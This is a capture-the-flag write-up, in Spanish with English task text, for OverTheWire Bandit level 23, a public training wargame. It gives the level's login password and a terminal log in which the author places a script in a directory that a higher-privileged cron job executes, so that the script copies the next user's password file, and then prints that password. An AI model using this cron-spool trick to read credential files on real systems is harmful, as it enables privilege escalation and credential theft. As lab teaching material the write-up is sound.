# Retos Bandit

## Objetivos

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso

User: bandit23
Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
Host: bandit.labs.overthewire.org  
Port: 2220

## Solución

``` Bash

bandit23@bandit:~$ ls -la /etc/cron.d
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Sep  1 06:30 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23 13:49 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ mkdir /tmp/akshanteamo
bandit23@bandit:~$ cd /tmp/akshanteamo
bandit23@bandit:/tmp/akshanteamo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/akshanteamo/password"
cat /etc/bandit_pass/bandit24 > /tmp/akshanteamo/password
bandit23@bandit:/tmp/akshanteamo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/akshanteamo/password" > cat elnivelosama.sh
bandit23@bandit:/tmp/akshanteamo$ cat elnivelosama.sh
cat: elnivelosama.sh: No such file or directory
bandit23@bandit:/tmp/akshanteamo$ ls
cat
bandit23@bandit:/tmp/akshanteamo$ cat cat
cat /etc/bandit_pass/bandit24 > /tmp/akshanteamo/password elnivelosama.sh
bandit23@bandit:/tmp/akshanteamo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/akshanteamo/password" > elnivelosama.sh
bandit23@bandit:/tmp/akshanteamo$ chmod 777 elnivelosama.sh
bandit23@bandit:/tmp/akshanteamo$ touch password
bandit23@bandit:/tmp/akshanteamo$ chmod 666 password
bandit23@bandit:/tmp/akshanteamo$ ls -la
total 196
drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:34 .
drwxrwx-wt 4821 root     root     184320 Sep  6 13:33 ..
-rw-rw-r--    1 bandit23 bandit23     74 Sep  6 13:31 cat
-rwxrwxrwx    1 bandit23 bandit23     58 Sep  6 13:32 elnivelosama.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Sep  6 13:34 password
bandit23@bandit:/tmp/akshanteamo$ cp elnivelosama.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/akshanteamo$ date
Tue Sep  6 01:35:09 PM UTC 2022
bandit23@bandit:/tmp/akshanteamo$ ls -la
total 200
drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:34 .
drwxrwx-wt 4821 root     root     184320 Sep  6 13:35 ..
-rw-rw-r--    1 bandit23 bandit23     74 Sep  6 13:31 cat
-rwxrwxrwx    1 bandit23 bandit23     58 Sep  6 13:32 elnivelosama.sh
-rw-rw-rw-    1 bandit23 bandit23     33 Sep  6 13:36 password
bandit23@bandit:/tmp/akshanteamo$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```

## Notas adicionales

## Referencias